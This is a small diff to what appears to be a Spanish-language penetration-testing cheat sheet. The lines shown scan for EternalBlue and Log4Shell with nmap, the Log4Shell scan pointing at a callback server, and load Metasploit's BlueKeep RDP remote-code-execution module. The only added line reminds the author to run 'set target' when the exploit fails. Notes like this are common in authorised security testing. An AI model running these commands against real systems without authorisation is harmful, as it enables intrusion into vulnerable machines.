@@ -621,6 +621,7 @@ nmap --script smb-vuln-ms17-010 -p 445 <TARGET_IP>
 # BLUEKEEP
 msfconsole
 use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
+RECUERDA USAR set target SI TE DA ERROR AL EXPLOIT
 
 # LOG4J
 nmap --script log4shell.nse --script-args log4shell.callback-server=<CALLBACK_SERVER_IP>:1389 -p 8080 <TARGET_IP>
